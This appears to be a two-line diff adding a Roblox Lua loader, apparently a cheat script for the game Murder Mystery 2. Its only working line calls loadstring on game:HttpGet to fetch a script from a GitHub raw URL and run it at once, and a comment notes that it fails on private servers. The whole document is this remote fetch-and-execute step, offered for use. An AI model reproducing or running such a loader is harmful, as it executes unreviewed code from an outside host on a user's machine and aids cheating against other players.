@@ -1,0 +1,2 @@
+-- this doesn't work in private server!!
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kierpogixd1/mm2-roblox/main/script.lua", true))()
